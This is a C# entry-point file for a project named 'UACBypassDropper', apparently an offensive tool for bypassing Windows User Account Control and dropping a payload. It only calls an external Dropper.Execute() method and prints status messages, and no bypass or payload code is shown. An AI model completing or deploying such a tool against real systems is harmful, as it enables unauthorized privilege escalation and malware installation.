using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UACBypassDropper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Starting!");
            try
            {
                Dropper.Execute();
                Console.WriteLine("[+] Done!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }
    }
}
